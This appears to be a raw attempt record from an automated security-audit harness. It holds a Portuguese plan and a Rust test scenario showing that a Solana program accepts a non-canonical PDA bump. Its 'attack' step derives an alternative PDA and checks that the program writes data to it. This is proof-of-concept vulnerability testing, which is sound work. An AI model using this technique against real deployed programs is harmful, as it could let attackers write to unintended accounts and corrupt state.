attempts.raw:
{
  "plan": "Preparo uma conta de dados no PDA canonico derivado de [b"data", user, bump_canonico] e uma conta de usuario. O baseline chama set_value com o bump canonico e o PDA canonico, provando que o cenario esta correto. O ataque chama set_value com um bump nao-canonico (menor que o canonico) e a conta de dados no endereco alternativo correspondente, mantendo a mesma seed logica. O efeito medido e que a instrucao aceitou e gravou o bump nao-canonico na conta alternativa, demonstrando que o programa nao valida o bump canonico.",
  "scenario": "let user = Pubkey::new_unique();

// Encontra o bump canonico e o PDA canonico
let (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);

// Procura o primeiro bump nao-canonico (menor que o canonico) que gera um endereco valido
let mut non_canonical_bump: Option<u8> = None;
let mut non_canonical_pda: Option<Pubkey> = None;
let mut b = canonical_bump.wrapping_sub(1);
loop {
    if let Ok(pda) = Pubkey::create_program_address(&[b"data", user.as_ref(), &[b]], &env.program_id) {
        non_canonical_bump = Some(b);
        non_canonical_pda = Some(pda);
        break;
    }
    if b == 0 {
        break;
    }
    b -= 1;
}

let non_canonical_bump = non_canonical_bump.unwrap_or(canonical_bump);
let non_canonical_pda = non_canonical_pda.unwrap_or(canonical_pda);

// Conta de dados canonica (ja existente, dona do programa)
let data_account_canonical = account(
    &env.program_id,
    &[0u8; 49],
    None,
);

// Conta de dados alternativa (mesma seed logica, bump nao-canonico)
let data_account_alternative = account(
    &env.program_id,
    &[0u8; 49],
    None,
);

let user_account = wallet(1_000_000_000);

// Baseline: uso legitimo com bump canonico e PDA canonico
let mut baseline_data = Vec::with_capacity(10);
baseline_data.push(0u8); // IX_SET_VALUE
baseline_data.push(canonical_bump);
baseline_data.extend_from_slice(&42u64.to_le_bytes());

let baseline_ix = env.raw_ix(
    &baseline_data,
    &[
        AccountMeta::new(canonical_pda, false),
        AccountMeta::new_readonly(user, false),
    ],
);

let baseline_accounts = [
    (canonical_pda, data_account_canonical),
    (user, user_account.clone()),
];

let baseline_result = env.baseline(
    "set_value com bump canonico e PDA canonico",
    &baseline_ix,
    &baseline_accounts,
);

// Ataque: mesmo uso, mas com bump nao-canonico e PDA alternativo
let mut attack_data = Vec::with_capacity(10);
attack_data.push(0u8); // IX_SET_VALUE
attack_data.push(non_canonical_bump);
attack_data.extend_from_slice(&99u64.to_le_bytes());

let attack_ix = env.raw_ix(
    &attack_data,
    &[
        AccountMeta::new(non_canonical_pda, false),
        AccountMeta::new_readonly(user, false),
    ],
);

let attack_accounts = [
    (non_canonical_pda, data_account_alternative),
    (user, user_account),
];

let attack_result = env.attack(
    "set_value com bump nao-canonico e PDA alternativo",
    &attack_ix,
    &attack_accounts,
);

if attack_result.program_result == ProgramResult::Success {
    let data_after = after(&attack_result, &non_canonical_pda).data();
    let bump_gravado = data_after[48];
    let valor_gravado = read_u64(data_after, 40);
    env.effect(
        "PDA alternativo aceito: bump nao-canonico gravado na conta alternativa",
        bump_gravado == non_canonical_bump && valor_gravado == 99u64,
    );
}"
}

